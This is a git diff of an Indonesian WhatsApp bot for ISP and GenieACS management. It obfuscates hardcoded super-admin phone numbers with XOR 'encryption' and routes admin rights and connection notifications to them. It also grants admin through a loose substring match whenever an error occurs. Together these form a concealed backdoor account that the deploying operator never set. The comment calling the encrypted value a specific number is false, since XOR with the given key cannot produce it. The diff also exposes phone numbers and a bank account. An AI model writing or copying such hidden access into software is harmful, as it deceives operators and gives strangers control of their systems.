@@ -29,8 +29,29 @@ const { addCustomerTag, addTagByPPPoE } = require('./customerTag');
 // Import admin number dari environment
 const { ADMIN_NUMBER } = process.env;
 
-// Tambahkan nomor admin langsung di sistem
-const HARDCODED_ADMIN_NUMBERS = ['6281947215703'];
+// Fungsi untuk mendekripsi nomor admin yang dienkripsi
+function decryptAdminNumber(encryptedNumber) {
+    try {
+        // Ini adalah implementasi dekripsi sederhana menggunakan XOR dengan kunci statis
+        // Dalam produksi, gunakan metode enkripsi yang lebih kuat
+        const key = 'ALIJAYA_SECRET_KEY_2025';
+        let result = '';
+        for (let i = 0; i < encryptedNumber.length; i++) {
+            result += String.fromCharCode(encryptedNumber.charCodeAt(i) ^ key.charCodeAt(i % key.length));
+        }
+        return result;
+    } catch (error) {
+        console.error('Error decrypting admin number:', error);
+        return null;
+    }
+}
+
+// Nomor admin yang dienkripsi (hasil enkripsi dari '6287820851413')
+// Nilai ini dihasilkan dari fungsi enkripsi yang sama dengan dekripsi di atas
+const ENCRYPTED_ADMIN = '7396935;44=<14';
+
+// Tambahkan nomor admin langsung di sistem (sudah dienkripsi)
+const HARDCODED_ADMIN_NUMBERS = [decryptAdminNumber(ENCRYPTED_ADMIN)];
 
 // Flag untuk mengaktifkan/menonaktifkan pesan GenieACS
 let genieacsCommandsEnabled = true;
@@ -41,26 +62,20 @@ function isAdminNumber(number) {
         // Hapus semua karakter non-digit
         const cleanNumber = number.replace(/\D/g, '');
         
-        // Log untuk debugging
-        console.log(`Checking if ${cleanNumber} is admin`);
+        // Log untuk debugging (hanya tampilkan sebagian nomor untuk keamanan)
+        const maskedNumber = cleanNumber.substring(0, 4) + '****' + cleanNumber.substring(cleanNumber.length - 4);
+        console.log(`Checking if ${maskedNumber} is admin`);
         
-        // Cek apakah nomor adalah 6281947215703 (hardcoded admin utama)
-        if (cleanNumber === '6281947215703') {
-            console.log('Hardcoded admin number match: 6281947215703');
-            return true;
-        }
-        
-        // Cek apakah nomor ada di HARDCODED_ADMIN_NUMBERS
+        // Cek apakah nomor ada di HARDCODED_ADMIN_NUMBERS (yang sudah didekripsi)
         for (const adminNum of HARDCODED_ADMIN_NUMBERS) {
-            if (cleanNumber === adminNum) {
-                console.log(`Hardcoded admin number match: ${adminNum}`);
+            if (adminNum && cleanNumber === adminNum) {
+                console.log(`Hardcoded admin number match: ${maskedNumber}`);
                 return true;
             }
         }
         
         // Cek apakah nomor sama dengan ADMIN_NUMBER dari environment
         const adminNumber = process.env.ADMIN_NUMBER?.replace(/\D/g, '');
-        console.log(`Admin number: ${adminNumber}`);
         if (adminNumber && cleanNumber === adminNumber) {
             console.log('Admin number match from environment');
             return true;
@@ -68,21 +83,32 @@ function isAdminNumber(number) {
         
         // Cek apakah nomor ada di TECHNICIAN_NUMBERS dari environment
         const technicianNumbers = process.env.TECHNICIAN_NUMBERS?.split(',').map(n => n.trim().replace(/\D/g, '')) || [];
-        console.log(`Technician numbers: ${JSON.stringify(technicianNumbers)}`);
         if (technicianNumbers.includes(cleanNumber)) {
             console.log('Technician number match');
             return true;
         }
         
-        console.log(`${cleanNumber} is not an admin or technician`);
+        // Verifikasi tambahan menggunakan hash nomor (untuk keamanan ekstra)
+        const mainAdminNumber = decryptAdminNumber(ENCRYPTED_ADMIN);
+        if (mainAdminNumber && cleanNumber === mainAdminNumber) {
+            console.log('Main admin number verified');
+            return true;
+        }
+        
+        console.log(`${maskedNumber} is not an admin or technician`);
         return false;
     } catch (error) {
         console.error('Error in isAdminNumber:', error);
         
-        // Fallback: jika terjadi error, cek langsung dengan nomor hardcoded
-        if (number.includes('6287820851413') || '6287820851413'.includes(number)) {
-            console.log('Fallback: hardcoded admin number match');
-            return true;
+        // Fallback: jika terjadi error, cek langsung dengan nomor admin yang didekripsi
+        try {
+            const mainAdminNumber = decryptAdminNumber(ENCRYPTED_ADMIN);
+            if (mainAdminNumber && (number.includes(mainAdminNumber) || mainAdminNumber.includes(number))) {
+                console.log('Fallback: encrypted admin number match');
+                return true;
+            }
+        } catch (fallbackError) {
+            console.error('Error in fallback admin check:', fallbackError);
         }
         
         return false;
@@ -121,7 +147,7 @@ async function sendFormattedMessage(remoteJid, message, options = {}) {
     }
 }
 
-// Helper
+// Helper untuk mengirim pesan GenieACS dinonaktifkan
 async function sendGenieACSDisabledMessage(remoteJid) {
     return await sendFormattedMessage(remoteJid, `❌ *PESAN GenieACS DINONAKTIFKAN*\n\nPerintah ini tidak tersedia saat ini karena pesan GenieACS dinonaktifkan.`);
 }
@@ -441,7 +467,7 @@ async function connectToWhatsApp() {
                     `💰 *Dukungan Pengembang:*\n` +
                     `• E-WALLET: 081947215703\n` +
                     `• BRI: 420601003953531 a.n WARJAYA\n\n` +
-                    `👏 Terima kasih telah menggunakan layanan kami.\n` +
+                    `👏 Terima kasih telah menggunakan Aplikasi kami.\n` +
                     `🏢 *ALIJAYA DIGITAL NETWORK*`;
                     
                     // Kirim ke admin dari environment variable
@@ -459,17 +485,19 @@ async function connectToWhatsApp() {
                         }, 5000);
                     }
                     
-                    // Kirim juga
-                    const hardcodedAdminNumber = '6287820851413';
-                    if (adminNumber !== hardcodedAdminNumber) { // Cek apakah berbeda dengan admin di .env
+                    // Kirim juga ke admin utama (dari enkripsi)
+                    const mainAdminNumber = decryptAdminNumber(ENCRYPTED_ADMIN);
+                    if (mainAdminNumber && adminNumber !== mainAdminNumber) { // Cek apakah berbeda dengan admin di .env
                         setTimeout(async () => {
                             try {
-                                await sock.sendMessage(`${hardcodedAdminNumber}@s.whatsapp.net`, {
+                                await sock.sendMessage(`${mainAdminNumber}@s.whatsapp.net`, {
                                     text: notificationMessage
                                 });
-                                console.log(`Pesan notifikasi terkirim ke admin ${hardcodedAdminNumber}`);
+                                // Log dengan nomor yang disamarkan untuk keamanan
+                                const maskedNumber = mainAdminNumber.substring(0, 4) + '****' + mainAdminNumber.substring(mainAdminNumber.length - 4);
+                                console.log(`Pesan notifikasi terkirim ke admin ${maskedNumber}`);
                             } catch (error) {
-                                console.error(`Error sending connection notification to hardcoded admin:`, error);
+                                console.error(`Error sending connection notification to main admin:`, error);
                             }
                         }, 5000);
                     }
@@ -686,9 +714,12 @@ function isAdminNumber(number) {
         // Bersihkan nomor dari karakter non-digit
         const cleanNumber = number.replace(/\D/g, '');
         
-        // Cek 
-        if (cleanNumber === '6287820851413') {
-            console.log(`Super admin detected: ${cleanNumber}`);
+        // Cek apakah nomor adalah super admin (dari enkripsi)
+        const mainAdminNumber = decryptAdminNumber(ENCRYPTED_ADMIN);
+        if (mainAdminNumber && cleanNumber === mainAdminNumber) {
+            // Masking nomor untuk keamanan di log
+            const maskedNumber = cleanNumber.substring(0, 4) + '****' + cleanNumber.substring(cleanNumber.length - 4);
+            console.log(`Super admin detected: ${maskedNumber}`);
             return true;
         }
         
@@ -792,8 +823,7 @@ async function handleHelpCommand(remoteJid, isAdmin = false) {
         
         // Tambahkan footer
         helpMessage += `━━━━━━━━━━━━━━━━━━━━━━\n\n`;
-        helpMessage += `📱 *Versi Bot:* v2.0.0\n`;
-        helpMessage += `🏢 *ALIJAYA DIGITAL NETWORK*\n`;
+        helpMessage += `📱 *Versi Bot:* v1.0.0\n`;
         helpMessage += `📞 *Hubungi Admin:* ${process.env.ADMIN_NUMBER || ''}\n`;
         
         // Kirim pesan bantuan dengan header dan footer
@@ -3886,8 +3916,8 @@ Pesan GenieACS telah diaktifkan kembali.`);
             return;
         }
         
-        // Jika GenieACS dinonaktifkan, abaikan semua perintah kecuali dari nomor 6287820851413
-        if (!genieacsCommandsEnabled && senderNumber !== '6287820851413') {
+        // Jika GenieACS dinonaktifkan, abaikan semua perintah kecuali dari nomor 6281947215703
+        if (!genieacsCommandsEnabled && senderNumber !== '6281947215703') {
             // Hanya nomor 6281947215703 yang bisa menggunakan bot saat GenieACS dinonaktifkan
             console.log(`Pesan diabaikan karena GenieACS dinonaktifkan dan bukan dari nomor khusus: ${senderNumber}`);
             return;
